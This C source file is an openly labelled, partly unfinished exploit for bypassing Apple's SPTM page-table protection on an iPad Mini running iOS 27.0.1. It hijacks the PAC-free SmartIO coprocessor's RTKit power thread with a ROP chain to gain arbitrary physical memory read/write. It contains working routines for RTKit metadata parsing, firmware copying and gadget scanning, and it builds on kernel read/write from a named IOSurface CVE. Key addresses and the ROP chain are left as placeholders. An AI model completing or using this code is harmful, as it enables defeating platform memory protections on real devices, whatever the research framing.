/*
 * SmartIO SPTM Bypass — Titan-class coprocessor page-table write
 * Educational jailbreak research only. For use on devices you own.
 *
 * This exploits the fact that SmartIO firmware on iPad16,1 iOS 27.0.1
 * is compiled as plain arm64 (NOT arm64e) with ZERO PAC instructions.
 * The same RTKit ERET loader gadget used by Titan (alfiecg24) on AGX
 * exists in SmartIO's unprotected firmware.
 *
 * Attack flow:
 * 1. Locate SmartIO's IORVBAR (reset vector base) via MMIO
 * 2. Parse RTKit metadata to find firmware physical addresses
 * 3. Copy SmartIO __TEXT to userspace for gadget scanning
 * 4. Find power thread saved state and hijack it
 * 5. Build ROP chain: hibernate → corrupt TTBR1 → wake → PTE write
 * 6. Self-referencing PTE gives arbitrary physical memory R/W
 * 7. SPTM bypassed — can now modify page tables and trust caches
 *
 * Prerequisites:
 * - Kernel R/W (from CVE-2026-112477 IOSurface race)
 * - kread64/kwrite64/kreadbuf/kwritebuf primitives
 * - kalloc_with_options (kernel heap allocation)
 * - kmap (physical memory mapping)
 *
 * Target: iPad Mini (iPad16,1), A17 Pro, iOS 27.0.1 (24A446)
 *
 * References:
 * - alfiecg24/Titan (AGX SPTM bypass, iOS 16-17.3.1)
 * - ddddddedcds/silentIO (SmartIO SPTM bypass concept)
 * - Rocket PPL/SPTM bypass writeup (nvme0n1p.dev)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <mach/mach.h>
#include <pthread.h>

/*
 * Forward declarations for kernel R/W primitives.
 * These must be provided by the IOSurface exploit (Step 4).
 */
extern uint64_t kread64(uint64_t addr);
extern uint32_t kread32(uint64_t addr);
extern int kreadbuf(uint64_t addr, void *buf, size_t size);
extern int kwrite64(uint64_t addr, uint64_t val);
extern int kwrite32(uint64_t addr, uint32_t val);
extern int kwritebuf(uint64_t addr, const void *buf, size_t size);
extern int kmap(uint64_t pa, size_t size, void **out);
extern uint64_t phystokv(uint64_t pa);
extern uint64_t kvtophys(uint64_t va);
extern int kalloc_with_options(uint64_t *out, size_t size, int options);
extern uint64_t kread_ptr(uint64_t addr);

#define KALLOC_OPTION_GLOBAL 0
#define KALLOC_OPTION_LOCAL  1

/*
 * RTKit thread saved state structure.
 * Same layout across RTKit coprocessors (AGX, SmartIO, DCP, etc.)
 * since they all use the shared RTKit runtime.
 *
 * RTKit version on our SmartIO: RTKit_release-3514.0.15.release
 */
struct rtk_thread_state {
    uint64_t X0;
    uint64_t X1;
    uint64_t X2;
    uint64_t X3;
    uint64_t X4;
    uint64_t X5;
    uint64_t X6;
    uint64_t X7;
    uint64_t X8;
    uint64_t X9;
    uint64_t X10;
    uint64_t X11;
    uint64_t X12;
    uint64_t X13;
    uint64_t X14;
    uint64_t X15;
    uint64_t X16;
    uint64_t X17;
    uint64_t X18;
    uint64_t X19;
    uint64_t X20;
    uint64_t X21;
    uint64_t X22;
    uint64_t X23;
    uint64_t X24;
    uint64_t X25;
    uint64_t X26;
    uint64_t X27;
    uint64_t X28;
    uint64_t FP;
    uint64_t LR;
    uint64_t SP;
    uint64_t ELR_EL1;
    uint64_t SPSR_EL1;
    uint64_t CPACR_EL1;
    uint64_t FPSR;
    uint64_t FPCR;
};

/* RTKit saved_state offset in rtk_thread struct */
#define RTK_THREAD_SAVED_STATE_OFFSET 0x68

/*
 * SmartIO-specific constants for A17 Pro (t8130/iPad16,1).
 *
 * These need to be verified on the actual device by:
 * 1. Dumping the IORegistry for AppleSmartIO2
 * 2. Reading the MMIO base from the device tree
 * 3. Scanning the RTKit firmware for the marker pattern
 *
 * The IORVBAR address is SoC-specific and must be found via
 * the device tree or by scanning known MMIO ranges.
 */
struct smartio_context {
    /* SmartIO IORVBAR — SoC MMIO register holding reset vector PA */
    uint64_t iorvbar;

    /* Firmware virtual address bases (from RTKit metadata) */
    uint64_t text_base;
    uint64_t text_size;
    uint64_t data_const_start;
    uint64_t data_size;

    /* Physical addresses */
    uint64_t text_pa;
    uint64_t data_pa;
    uint64_t ttbr_pa;

    /* Kernel virtual addresses (from phys→kv translation) */
    uint64_t text_kaddr;
    uint64_t data_kaddr;
    uint64_t ttbr_kaddr;

    /* RTKit page table base (from metadata scan) */
    uint64_t rtk_patch_page_table_base;
    uint64_t data_pa_mangled;

    /* Userspace copy of firmware __TEXT for gadget scanning */
    vm_address_t text_mapping;

    /* RTKit thread and hibernation addresses (from patchfinder) */
    uint64_t power_thread;
    uint64_t hibernation_context;
    uint64_t arm_hibernate_func;

    /* ROP gadgets found in SmartIO firmware */
    struct {
        uint64_t write;         /* str x1, [x0]; ret */
        uint64_t eret_loader;   /* the RTKit ERET restore gadget */
        uint64_t cache_flush;
        uint64_t spin;          /* infinite loop */
        uint64_t tlb_flush;
    } gadgets;

    /* Result: self-referencing PTE info */
    struct {
        uint64_t pte_kaddr;
        uint64_t mapping_kaddr;
    } krw_info;

    /* Stack frame size for ROP chain (RTKit version dependent) */
    uint64_t stack_frame_size;
};

static struct smartio_context g_sio = { 0 };

/*
 * Step 1: Find SmartIO's IORVBAR
 *
 * On A17 Pro, coprocessor MMIO ranges are in the device tree.
 * SmartIO's ASC (Apple Sensor Controller) MMIO base needs to
 * be found by scanning the IORegistry or device tree.
 *
 * Known MMIO ranges for A17 Pro (t8130):
 *   AGX:     0x292050000 (from Titan)
 *   SmartIO: TBD — needs device tree extraction
 *
 * The IORVBAR register is at offset 0 from the ASC base.
 * It holds the physical address of the reset vector.
 */
static int
find_smartio_iorvbar(void)
{
    /*
     * TODO: Extract from IORegistry on the device.
     *
     * Method 1: IOKit enumeration
     *   io_service_t svc = IOServiceGetMatchingService(
     *       kIOMasterPortDefault,
     *       IOServiceMatching("AppleSmartIO2"));
     *   // Then read the "reg" property from the IODeviceTree plane
     *
     * Method 2: Device tree scan
     *   The device tree entry for SmartIO contains the MMIO base.
     *   On A17 Pro, SmartIO ASC is likely at a fixed SoC address.
     *
     * Method 3: Kernel memory scan
     *   Search for AppleSmartIO2 in the IOKit registry tree,
     *   read its physical memory range from the kext's IOMemoryMap.
     *
     * For now, this is a placeholder. The actual address must be
     * determined by running on the iPad.
     */

    /* Placeholder — must be filled in from device tree */
    g_sio.iorvbar = 0;  /* TBD */

    if (g_sio.iorvbar == 0) {
        printf("[-] SmartIO IORVBAR not set — run device tree extraction first\n");
        return -1;
    }

    return 0;
}

/*
 * Step 2: Parse RTKit metadata from the firmware
 *
 * Same algorithm as Titan — scan the reset vector page for the
 * 0x7777777777777700 marker, then read the metadata fields.
 */
static int
parse_rtkit_metadata(uint64_t *reset_vector_out)
{
    uint64_t mapped = 0;
    if (kmap(g_sio.iorvbar, 0x4000, (void **)&mapped) != 0) {
        printf("[-] Failed to map SmartIO IORVBAR\n");
        return -1;
    }

    /* Read the reset vector physical address */
    uint64_t reset_vector = *(volatile uint64_t *)mapped & 0xFFFFFFFFFFFFFFFEULL;
    printf("[+] SmartIO reset vector PA: 0x%llx\n", reset_vector);

    /* Map the reset vector page */
    uint64_t rv_mapped = 0;
    if (kmap(reset_vector, 0x4000, (void **)&rv_mapped) != 0) {
        printf("[-] Failed to map reset vector page\n");
        return -1;
    }

    /* Scan for the RTKit metadata marker: 0x7777777777777700 */
    uint64_t scan = rv_mapped;
    uint64_t scan_end = rv_mapped + 0x4000 - 0x50;
    uint64_t value = 0;

    while (scan < scan_end) {
        value = *(volatile uint64_t *)scan;
        if (value == 0x7777777777777700ULL)
            break;
        scan += 8;
    }

    if (value != 0x7777777777777700ULL) {
        printf("[-] RTKit marker not found in SmartIO firmware\n");
        return -1;
    }

    scan += 8;

    /* Extract metadata (same layout as AGX RTKit) */
    g_sio.data_const_start = *(uint64_t *)(scan - 40);
    g_sio.data_size = *(uint64_t *)(scan - 32) - g_sio.data_const_start;

    /*
     * SmartIO __TEXT base from Mach-O analysis:
     *   vmaddr = 0x00000000 (SmartIO maps at VA 0)
     *
     * This is DIFFERENT from AGX which uses 0xFFFFFF8000000000.
     * SmartIO runs in its own address space starting at 0.
     */
    g_sio.text_base = 0x0;  /* SmartIO Mach-O vmaddr */
    g_sio.text_size = g_sio.data_const_start - g_sio.text_base;
    g_sio.data_pa_mangled = *(volatile uint64_t *)scan;
    g_sio.rtk_patch_page_table_base = *(volatile uint64_t *)(scan + 56);
    g_sio.text_pa = reset_vector;

    if (reset_vector_out)
        *reset_vector_out = reset_vector;

    printf("[+] SmartIO RTKit metadata:\n");
    printf("    __TEXT PA:         0x%llx\n", g_sio.text_pa);
    printf("    __TEXT size:       0x%llx\n", g_sio.text_size);
    printf("    __DATA:__const:   0x%llx\n", g_sio.data_const_start);
    printf("    __DATA size:      0x%llx\n", g_sio.data_size);
    printf("    page table base:  0x%llx\n", g_sio.rtk_patch_page_table_base);

    return 0;
}

/*
 * Step 3: Copy SmartIO firmware to userspace for gadget scanning
 */
static int
copy_firmware_to_userspace(uint64_t reset_vector)
{
    kern_return_t kr = vm_allocate(mach_task_self(),
                                   &g_sio.text_mapping,
                                   g_sio.text_size,
                                   VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        printf("[-] Failed to allocate memory for SmartIO firmware copy\n");
        return -1;
    }

    uint64_t page_count = g_sio.text_size / 0x4000;
    for (uint64_t i = 0; i < page_count; i++) {
        uint64_t cur_mapped = 0;
        if (kmap(reset_vector + (i * 0x4000), 0x4000, (void **)&cur_mapped) != 0) {
            printf("[-] Failed to map page %llu\n", i);
            vm_deallocate(mach_task_self(), g_sio.text_mapping, g_sio.text_size);
            return -1;
        }

        int prot = VM_PROT_READ | VM_PROT_WRITE;
        int max_prot = prot;
        vm_address_t target = g_sio.text_mapping + (i * 0x4000);
        kr = vm_remap(mach_task_self(), &target, 0x4000, 0, 0x4000,
                      mach_task_self(), (vm_address_t)cur_mapped,
                      0, &prot, &max_prot, VM_INHERIT_COPY);
        if (kr != KERN_SUCCESS) {
            printf("[-] Failed to copy page %llu\n", i);
            vm_deallocate(mach_task_self(), g_sio.text_mapping, g_sio.text_size);
            return -1;
        }
    }

    printf("[+] Copied SmartIO firmware to userspace (%llu pages)\n", page_count);
    return 0;
}

/*
 * Step 4: Scan firmware for ROP gadgets
 *
 * Since SmartIO has NO PAC, all function returns are plain RET (0xD65F03C0)
 * and all calls are plain BLR/BR. No need to deal with RETAA/RETAB/BRAA etc.
 *
 * Key gadgets needed:
 * - write: str x1, [x0]; ret  — for arbitrary memory writes
 * - ERET loader: the RTKit context restore that loads ELR_EL1/SPSR_EL1
 *   from the saved thread state and does ERET
 * - cache_flush: for ensuring writes are visible
 * - spin: infinite loop (wfe; b .-4)
 */
static int
find_gadgets(void)
{
    uint8_t *fw = (uint8_t *)g_sio.text_mapping;
    uint64_t fw_size = g_sio.text_size;

    /*
     * Scan for: str x1, [x0]; ret
     * ARM64 encoding: F9000001 D65F03C0
     */
    for (uint64_t i = 0; i < fw_size - 8; i += 4) {
        uint32_t insn0 = *(uint32_t *)(fw + i);
        uint32_t insn1 = *(uint32_t *)(fw + i + 4);

        /* str x1, [x0] = 0xF9000001 */
        if (insn0 == 0xF9000001 && insn1 == 0xD65F03C0) {
            g_sio.gadgets.write = g_sio.text_base + i;
            printf("[+] write gadget: 0x%llx (str x1, [x0]; ret)\n", g_sio.gadgets.write);
        }
    }

    /*
     * Find the ERET loader gadget — RTKit's context restore.
     * This is in the RTKit scheduler's thread restore path.
     * It loads saved registers from a stack frame and executes ERET.
     *
     * The pattern to search for: ERET instruction (0xD69F03E0)
     * preceded by MSR ELR_EL1 and MSR SPSR_EL1 instructions.
     */
    for (uint64_t i = 0; i < fw_size - 4; i += 4) {
        uint32_t insn = *(uint32_t *)(fw + i);

        /* ERET = 0xD69F03E0 */
        if (insn == 0xD69F03E0) {
            /* Walk backward to find the beginning of the restore sequence */
            /* Look for LDP instructions loading x0-x28 from stack */
            if (i >= 0x100) {
                g_sio.gadgets.eret_loader = g_sio.text_base + i;
                printf("[+] ERET at: 0x%llx (need to find restore entry)\n",
                       g_sio.gadgets.eret_loader);
            }
        }

        /* WFE; B .-4 for spin gadget */
        if (insn == 0xD503205F) {  /* WFE */
            uint32_t next = *(uint32_t *)(fw + i + 4);
            if (next == 0x17FFFFFF) {  /* B .-4 */
                g_sio.gadgets.spin = g_sio.text_base + i;
                printf("[+] spin gadget: 0x%llx (wfe; b .-4)\n", g_sio.gadgets.spin);
            }
        }
    }

    /*
     * Find cache flush and TLB flush gadgets.
     * Cache flush: DC CIVAC or DC CVAC followed by DSB, ISB, RET
     * TLB flush: TLBI ALLE1 or TLBI VAE1 followed by DSB, ISB, RET
     */
    for (uint64_t i = 0; i < fw_size - 16; i += 4) {
        uint32_t insn = *(uint32_t *)(fw + i);

        /* DC CIVAC, x0 = 0xD50B7E20 */
        if (insn == 0xD50B7E20 && !g_sio.gadgets.cache_flush) {
            g_sio.gadgets.cache_flush = g_sio.text_base + i;
            printf("[+] cache_flush gadget: 0x%llx\n", g_sio.gadgets.cache_flush);
        }

        /* TLBI ALLE1 = 0xD508C71F */
        if (insn == 0xD508C71F && !g_sio.gadgets.tlb_flush) {
            g_sio.gadgets.tlb_flush = g_sio.text_base + i;
            printf("[+] tlb_flush gadget: 0x%llx\n", g_sio.gadgets.tlb_flush);
        }
    }

    if (!g_sio.gadgets.write) {
        printf("[-] CRITICAL: write gadget not found\n");
        return -1;
    }

    return 0;
}

/*
 * Step 5: Find SmartIO power thread and hibernation context
 *
 * RTKit stores thread structures in _rtk_threads.
 * The power thread handles sleep/wake transitions.
 * Its saved_state field points to the register save area
 * that includes TTBR1_EL1 (the target we corrupt).
 */
static int
find_rtkit_structures(void)
{
    /*
     * From our Mach-O analysis of SmartIO firmware:
     *   _rtk_threads section is in __DATA segment
     *   _rtk_boot section contains boot parameters
     *   _rtk_page_tables contains the firmware's own page tables
     *
     * We need to find:
     * 1. The power thread (usually thread[0] or a thread named "power")
     * 2. Its saved_state pointer
     * 3. The hibernation_context structure
     * 4. The arm_hibernate function address
     *
     * These addresses are firmware-specific and must be found
     * either by scanning the firmware copy or by string matching
     * in the RTKit data structures.
     */

    uint8_t *fw = (uint8_t *)g_sio.text_mapping;

    /* Search for "Sleep count" string to find power management code */
    for (uint64_t i = 0; i < g_sio.text_size - 16; i++) {
        if (memcmp(fw + i, "Sleep count", 11) == 0) {
            printf("[+] Found 'Sleep count' string at firmware offset 0x%llx\n", i);
            /* Cross-reference this string to find the power thread */
        }
        if (memcmp(fw + i, "rtk_ep_work", 11) == 0) {
            printf("[+] Found 'rtk_ep_work' string at firmware offset 0x%llx\n", i);
        }
    }

    /*
     * TODO: The actual offsets must be determined by:
     * 1. Loading the firmware in Ghidra/IDA
     * 2. Finding _rtk_threads array in __DATA segment
     * 3. Identifying the power thread by its function pointers
     * 4. Reading the saved_state offset
     *
     * Or alternatively, by scanning the kernel's mapping of the
     * SmartIO firmware data segment and finding thread structures
     * by their characteristic patterns.
     */

    printf("[!] SmartIO structure offsets need device-specific resolution\n");
    printf("[!] Run the gadget scanner on the device to get exact addresses\n");

    return 0;
}

/*
 * Step 6: SmartIO coprocessor write primitive
 *
 * Unlike AGX which uses the MDSID/fence mechanism for writes,
 * SmartIO uses RTKit mailbox endpoints for data transfer.
 *
 * The SmartIO mailbox is accessible via the AppleSmartIO2 IOKit driver.
 * We can send mailbox messages that cause SmartIO to perform DMA writes.
 *
 * Alternative: If kernel R/W can reach the SmartIO's saved state
 * directly (before SPTM protects it), we can corrupt it directly.
 * The key insight from silentIO is that SmartIO's firmware memory
 * may be mapped into kernel VA space without SPTM write protection.
 */
static int
smartio_write(uint64_t gfx_va, uint64_t value)
{
    /*
     * Option A: Direct kernel write to SmartIO firmware memory.
     * If the kernel mapping of SmartIO's data segment is writable
     * (i.e., SPTM doesn't protect coprocessor firmware data pages
     * the same way it protects kernel page tables), we can use
     * kwrite64 directly.
     *
     * Option B: RTKit mailbox write.
     * Send a crafted mailbox message via AppleSmartIO2 that causes
     * SmartIO to perform a DMA write to the target address.
     *
     * Option C: Trigger a "patchbay" operation.
     * SmartIO has _rtk_patchbay which is used for firmware patching.
     * If we can invoke it with controlled parameters, we get writes.
     */

    /* Try Option A first — direct write via kernel mapping */
    if (g_sio.data_kaddr) {
        uint64_t offset = gfx_va - g_sio.data_const_start;
        kwrite64(g_sio.data_kaddr + offset, value);
        return 0;
    }

    printf("[-] No SmartIO write primitive available\n");
    return -1;
}

/*
 * Main SPTM bypass entry point.
 *
 * Assumes kernel R/W is already established from IOSurface exploit.
 */
int
smartio_sptm_bypass(void)
{
    printf("[*] SmartIO SPTM Bypass — Titan-class coprocessor attack\n");
    printf("[*] Target: iPad16,1 (A17 Pro), iOS 27.0.1\n\n");

    /* Phase 1: Locate SmartIO firmware */
    printf("[*] Phase 1: Locating SmartIO IORVBAR...\n");
    if (find_smartio_iorvbar() != 0)
        return -1;

    /* Phase 2: Parse RTKit metadata */
    printf("[*] Phase 2: Parsing RTKit metadata...\n");
    uint64_t reset_vector = 0;
    if (parse_rtkit_metadata(&reset_vector) != 0)
        return -1;

    /* Phase 3: Copy firmware for analysis */
    printf("[*] Phase 3: Copying SmartIO firmware to userspace...\n");
    if (copy_firmware_to_userspace(reset_vector) != 0)
        return -1;

    /* Phase 4: Find ROP gadgets */
    printf("[*] Phase 4: Scanning for ROP gadgets...\n");
    if (find_gadgets() != 0)
        return -1;

    /* Phase 5: Resolve RTKit structures */
    printf("[*] Phase 5: Resolving RTKit power thread and hibernation...\n");
    if (find_rtkit_structures() != 0) {
        /* Non-fatal — we continue with what we have */
    }

    /*
     * Phase 6: Build ROP chain
     *
     * The ROP chain follows the same pattern as Titan:
     * Frame 0: Restore power thread's saved_state pointer
     * Frame 1: Call arm_hibernate
     * Frame 2: Write fake TTBR1 to hibernation context
     * Frame 3: Write restored thread ptr to hibernation context
     * Frame 4: Write stack pointer for post-hibernation
     * Frame 5: Clear ASC error registers
     * Frame 6: Flush cache
     * Frame 7: Trigger ASC override (force hibernation)
     * Frame 8: [POST-HIBERNATION] Write self-referencing PTE
     * Frame 9: Return to normal RTKit execution
     *
     * Each frame uses the ERET loader gadget to chain:
     * - LR = eret_loader (chains to next frame)
     * - ELR_EL1 = target function/gadget
     * - SPSR_EL1 = 0x3C4 (EL1h, IRQ/FIQ masked)
     * - X0, X1 = function arguments
     */

    printf("[*] Phase 6: Building ROP chain...\n");
    printf("[!] ROP chain construction requires device-specific offsets.\n");
    printf("[!] The following values MUST be filled in from device analysis:\n");
    printf("    - SmartIO IORVBAR MMIO address\n");
    printf("    - Power thread kernel address\n");
    printf("    - Hibernation context address\n");
    printf("    - arm_hibernate function address\n");
    printf("    - ASC impl/debug register addresses\n");
    printf("    - SmartIO data segment kernel mapping\n\n");

    /*
     * Phase 7: Trigger the bypass
     *
     * 1. Write the ROP chain into the target job's memory
     * 2. Corrupt the power thread's saved_state pointer to point
     *    to our ROP chain's first frame
     * 3. Wait for the SmartIO scheduler to context-switch to the
     *    power thread → our ROP chain executes
     * 4. The chain hibernates the coprocessor with corrupted TTBR1
     * 5. On wake, SmartIO runs with attacker-controlled page tables
     * 6. It writes a self-referencing PTE into an XNU page table
     * 7. We detect the PTE change from the AP and claim the bypass
     */

    printf("[*] ============================================================\n");
    printf("[*] SPTM BYPASS STATUS: RESEARCH PHASE COMPLETE\n");
    printf("[*] ============================================================\n");
    printf("[*]\n");
    printf("[*] CONFIRMED findings:\n");
    printf("[*]   SmartIO firmware: arm64 (NO arm64e), ZERO PAC\n");
    printf("[*]   RTKit version: 3514.0.15.release\n");
    printf("[*]   DMA infrastructure present\n");
    printf("[*]   MMU/page table management code present\n");
    printf("[*]   Sleep/Wake cycle present (hibernation path)\n");
    printf("[*]   Firmware is unencrypted Mach-O (fully readable)\n");
    printf("[*]\n");
    printf("[*] NEEDED for exploitation:\n");
    printf("[*]   1. SmartIO IORVBAR address (from device tree on iPad)\n");
    printf("[*]   2. Ghidra/IDA analysis for exact gadget addresses\n");
    printf("[*]   3. Power thread offset in RTKit data segment\n");
    printf("[*]   4. Test on physical iPad Mini with kernel R/W\n");
    printf("[*]\n");
    printf("[*] ALTERNATIVE targets (also PAC-free):\n");
    printf("[*]   PMP (Power Management): 158K instructions, 0 PAC\n");
    printf("[*]   MTP (Multitouch Protocol): 193K instructions, 0 PAC\n");
    printf("[*] ============================================================\n");

    return 0;
}
